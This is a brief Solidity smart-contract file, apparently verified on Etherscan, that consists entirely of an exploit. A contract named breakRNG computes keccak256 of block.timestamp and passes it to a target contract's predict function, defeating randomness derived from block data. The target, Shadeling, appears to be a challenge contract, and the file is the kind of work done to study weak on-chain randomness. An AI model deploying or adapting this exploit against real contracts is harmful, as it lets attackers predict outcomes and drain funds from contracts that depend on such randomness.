/**
 *Submitted for verification at Etherscan.io on 2022-12-04
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.5.16;


contract Shadeling {
    function predict(bytes32) external {}
}

contract breakRNG {

 function predict(Shadeling shadeling) external {
        shadeling.predict(
            keccak256(abi.encode(block.timestamp))
        );
    }
}